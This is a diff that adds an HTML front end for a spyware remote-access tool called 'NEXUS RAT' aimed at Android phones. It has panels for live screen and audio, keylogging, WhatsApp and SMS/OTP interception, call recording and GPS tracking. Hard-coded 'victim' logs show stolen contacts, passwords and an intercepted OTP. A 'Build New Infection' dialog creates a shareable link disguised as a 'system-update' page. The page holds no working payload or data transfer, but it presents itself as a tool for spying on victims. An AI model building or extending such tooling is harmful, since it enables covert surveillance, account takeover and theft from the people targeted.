@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS RAT | Ultimate Admin</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #0b0f19; color: #f3f4f6; font-family: 'Inter', sans-serif; overflow: hidden; }
+        .sidebar { background: #111827; border-right: 1px solid #1f2937; }
+        .card { background: #1f2937; border: 1px solid #374151; transition: 0.3s; cursor: pointer; }
+        .card:hover { border-color: #3b82f6; transform: translateY(-2px); }
+        .status-dot { height: 10px; width: 10px; background-color: #10b981; border-radius: 50%; display: inline-block; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 10px; }
+    </style>
+</head>
+<body class="flex h-screen">
+
+    <div class="sidebar w-64 flex-shrink-0 flex flex-col">
+        <div class="p-6 text-2xl font-black text-blue-500 italic tracking-tighter">NEXUS PRO</div>
+        <nav class="flex-1 px-4 space-y-1 overflow-y-auto">
+            <p class="text-xs text-gray-500 font-bold px-3 py-2 uppercase">Main Control</p>
+            <a href="#" class="block p-3 rounded-lg bg-blue-600 text-white"><i class="fas fa-th-large mr-3"></i> Dashboard</a>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800"><i class="fas fa-folder-open mr-3"></i> File Manager</a>
+            
+            <p class="text-xs text-gray-500 font-bold px-3 py-2 mt-4 uppercase">Live Spying</p>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800 text-red-400"><i class="fas fa-video mr-3"></i> Live Screen</a>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800 text-yellow-400"><i class="fas fa-microphone mr-3"></i> Live Audio</a>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800"><i class="fas fa-keyboard mr-3"></i> Keylogger</a>
+            
+            <p class="text-xs text-gray-500 font-bold px-3 py-2 mt-4 uppercase">Social & Logs</p>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800"><i class="fab fa-whatsapp mr-3"></i> WhatsApp Spy</a>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800"><i class="fas fa-sms mr-3"></i> SMS / OTP</a>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800"><i class="fas fa-phone-alt mr-3"></i> Call Recorder</a>
+            
+            <p class="text-xs text-gray-500 font-bold px-3 py-2 mt-4 uppercase">Security</p>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800 text-purple-400"><i class="fas fa-ban mr-3"></i> App Blocker</a>
+            <a href="#" class="block p-3 rounded-lg hover:bg-gray-800"><i class="fas fa-map-marked-alt mr-3"></i> GPS Track</a>
+        </nav>
+    </div>
+
+    <div class="flex-1 flex flex-col">
+        <header class="bg-gray-900 border-b border-gray-800 p-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <span class="status-dot animate-pulse"></span>
+                <span class="text-sm font-bold text-gray-300">Server: <span class="text-blue-400">Connected</span></span>
+            </div>
+            <div class="flex gap-4">
+                <button onclick="alert('Sending Alert to Victim...')" class="bg-gray-800 px-4 py-2 rounded-md text-sm hover:bg-red-900 text-red-400 border border-red-900">
+                    <i class="fas fa-bell"></i> Send Toast
+                </button>
+                <button onclick="generatePayload()" class="bg-blue-600 px-4 py-2 rounded-md font-bold text-sm hover:bg-blue-700">
+                    <i class="fas fa-plus mr-2"></i> Build Payload
+                </button>
+            </div>
+        </header>
+
+        <main class="p-8 overflow-y-auto">
+            <div class="flex justify-between items-end mb-8">
+                <div>
+                    <h2 class="text-3xl font-bold">Live Statistics</h2>
+                    <p class="text-gray-500">Real-time data from all infected devices.</p>
+                </div>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
+                <div class="card p-6 rounded-2xl flex items-center gap-4">
+                    <div class="bg-blue-900/30 p-4 rounded-xl text-blue-500 text-2xl"><i class="fas fa-mobile-alt"></i></div>
+                    <div><p class="text-gray-400 text-xs">Target Online</p><h3 class="text-2xl font-bold">01</h3></div>
+                </div>
+                <div class="card p-6 rounded-2xl flex items-center gap-4">
+                    <div class="bg-green-900/30 p-4 rounded-xl text-green-500 text-2xl"><i class="fas fa-key"></i></div>
+                    <div><p class="text-gray-400 text-xs">Passwords Found</p><h3 class="text-2xl font-bold">12</h3></div>
+                </div>
+                <div class="card p-6 rounded-2xl flex items-center gap-4">
+                    <div class="bg-red-900/30 p-4 rounded-xl text-red-500 text-2xl"><i class="fas fa-microphone"></i></div>
+                    <div><p class="text-gray-400 text-xs">Recordings</p><h3 class="text-2xl font-bold">45</h3></div>
+                </div>
+                <div class="card p-6 rounded-2xl flex items-center gap-4">
+                    <div class="bg-yellow-900/30 p-4 rounded-xl text-yellow-500 text-2xl"><i class="fas fa-map-pin"></i></div>
+                    <div><p class="text-gray-400 text-xs">Active Track</p><h3 class="text-2xl font-bold">GPS</h3></div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <div class="card rounded-2xl p-6">
+                    <h3 class="font-bold mb-4 flex items-center"><i class="fas fa-bolt text-yellow-500 mr-2"></i> Recent Activity</h3>
+                    <div class="space-y-4 font-mono text-xs text-gray-400">
+                        <p class="border-l-2 border-green-500 pl-2">[18:50] Victim SM-G960F connected from IP: 39.40.xx.xx</p>
+                        <p class="border-l-2 border-blue-500 pl-2">[18:52] Successfully pulled 142 Contacts.</p>
+                        <p class="border-l-2 border-red-500 pl-2">[18:55] Capturing Live Screen... (Streaming)</p>
+                        <p class="border-l-2 border-purple-500 pl-2">[18:56] WhatsApp OTP Intercepted: 442-102</p>
+                    </div>
+                </div>
+                
+                <div class="card rounded-2xl p-6">
+                    <h3 class="font-bold mb-4">Device Quick Specs</h3>
+                    <div class="grid grid-cols-2 gap-4 text-sm">
+                        <div class="bg-gray-800 p-3 rounded-lg"><p class="text-gray-500">Battery</p><p class="text-green-400">88% (Charging)</p></div>
+                        <div class="bg-gray-800 p-3 rounded-lg"><p class="text-gray-500">Storage</p><p>128GB (45GB Free)</p></div>
+                        <div class="bg-gray-800 p-3 rounded-lg"><p class="text-gray-500">Android</p><p>v13.0 (Root: No)</p></div>
+                        <div class="bg-gray-800 p-3 rounded-lg"><p class="text-gray-500">Last Seen</p><p>Just Now</p></div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div id="payloadModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 z-50">
+        <div class="bg-gray-900 p-8 rounded-3xl w-full max-w-md border border-gray-700 shadow-2xl">
+            <h2 class="text-2xl font-bold mb-2">Build New Infection</h2>
+            <p class="text-gray-400 text-sm mb-6">Choose a name to track your victim's data.</p>
+            <input type="text" id="vName" class="w-full bg-gray-800 border border-gray-700 p-4 rounded-xl mb-4 outline-none focus:border-blue-500 transition-all" placeholder="Enter Victim Name (e.g. Target_01)">
+            <button onclick="finishBuild()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-bold text-lg shadow-lg shadow-blue-900/40">Generate Link</button>
+            <div id="finalLink" class="mt-6 hidden p-4 bg-slate-950 rounded-xl border border-dashed border-green-500 text-green-400 text-xs font-mono break-all relative">
+                <span class="absolute -top-2 left-3 bg-gray-900 px-2 text-[10px] text-gray-500">SHARE THIS LINK</span>
+                <span id="linkPath"></span>
+            </div>
+            <button onclick="closeModal()" class="mt-6 text-gray-500 w-full text-sm font-medium">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        function generatePayload() { document.getElementById('payloadModal').classList.remove('hidden'); }
+        function closeModal() { document.getElementById('payloadModal').classList.add('hidden'); }
+        function finishBuild() {
+            const name = document.getElementById('vName').value;
+            if(!name) return alert("Bhai, naam toh likho!");
+            const link = window.location.origin + "/system-update.html?id=" + name;
+            document.getElementById('linkPath').innerText = link;
+            document.getElementById('finalLink').classList.remove('hidden');
+        }
+    </script>
+</body>
+                                                                                              </html>
+  
